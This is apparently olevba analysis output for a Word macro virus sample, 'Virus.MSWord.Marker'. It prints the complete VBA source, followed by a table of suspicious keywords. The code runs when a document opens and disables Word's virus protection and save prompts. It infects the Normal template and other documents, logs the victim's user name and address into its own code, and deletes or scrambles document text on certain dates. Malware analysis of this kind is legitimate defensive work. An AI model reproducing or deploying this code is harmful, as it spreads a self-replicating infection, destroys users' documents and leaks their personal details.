olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.cw-3ed1de0ac4fb4b0192bf99514b66621de71d91cd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.cw-3ed1de0ac4fb4b0192bf99514b66621de71d91cd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open(): IT
End Sub
Private Function IT()
        
    'Application.Options.ConfirmConversions = False: Application.EnableCancelKey = wdCancelDisabled
    'FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable: FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    'CommandBars("Tools").Controls("Macro").Enabled = False
    'If Application.Version = 9# Then: CommandBars("Macro").Controls("Security...").Enabled = 0
    'If Application.Version = 8# Then
        'With Application.Options: .VirusProtection = False: .SaveNormalPrompt = False: End With
    'End If
    
    newf
    
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
            
End Function

Private Function newf()

    Dim maker, Oldmaker
    
    maker = "BLowMaster"
    Options.SaveNormalPrompt = False
    Dim SavDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
    Options.SaveNormalPrompt = False
    Oldmaker = "-> this is another maker!"
    Dim newd, nt As Object
    Options.SaveNormalPrompt = False
    
    Set newd = ActiveDocument.VBProject.VBComponents.Item(1)
    Options.SaveNormalPrompt = False
    Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
    Options.SaveNormalPrompt = False
           
    
    DocumentInfected = newd.CodeModule.Find(maker, 1, 1, 10000, 10000)
    Options.SaveNormalPrompt = False
    NormalTemplateInfected = nt.CodeModule.Find(maker, 1, 1, 10000, 10000)
    Options.SaveNormalPrompt = False
    
    
    'Make sure that some conditions are true before we continue infecting anything
    If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
        (ActiveDocument.SaveFormat = wdFormatDocument Or _
        ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
        Options.SaveNormalPrompt = False
        'Infect the NormalTemplate
        If DocumentInfected = True Then
  
            SaveNormalTemplate = NormalTemplate.Saved
            Options.SaveNormalPrompt = False
  
            Mycode = newd.CodeModule.Lines(1, newd.CodeModule.CountOfLines)

            'Write a log file of this NormalTemplate infection
            For I = 1 To Len(Application.UserAddress)
                If Mid(Application.UserAddress, I, 1) <> Chr(13) Then
                    If Mid(Application.UserAddress, I, 1) <> Chr(10) Then
                        UserAddress = UserAddress & Mid(Application.UserAddress, I, 1)
                        Options.SaveNormalPrompt = False
                    End If
                Else
                    UserAddress = UserAddress & Chr(13) & "' "
                    Options.SaveNormalPrompt = False
                End If
            Next I

            Mycode = Mycode & Chr(13) & _
                      "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                      Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
                      "' " & Application.UserName & Chr(13) & _
                      "' " & UserAddress & Chr(13)


            nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
            nt.CodeModule.AddFromString Mycode
    
            If SaveNormalTemplate = True Then NormalTemplate.Save
    
        End If


        'Infect the ActiveDocument
        If NormalTemplateInfected = True And _
            (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
             ActiveDocument.Saved = False) Then
  
            SavDocument = ActiveDocument.Saved
            Options.SaveNormalPrompt = False
    
            Mycode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

            newd.CodeModule.DeleteLines 1, newd.CodeModule.CountOfLines
            newd.CodeModule.AddFromString Mycode
    
            If SavDocument = True Then ActiveDocument.Save
      
        End If
  
    End If
    
    Options.VirusProtection = False
    Options.SaveNormalPrompt = True
    
    If (Day(Now()) = 15) And (Month(Now()) Mod 2 = 0) Then
    
        ActiveDocument.Select
        Selection.Cut
        ActiveDocument.Save
        'test
    ElseIf (Day(Now()) = 13) Then
        ActiveDocument.Select
        Selection.Font.Name = "Webdings"
        ActiveDocument.Save
        ' test
    End If
    
End Function
' 11:17:42 AM - Wednesday, 22 Mar 2000
' Ditry PC
'



' 08:15:11  - вторник, 20 дек 2005
' xLock
'



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

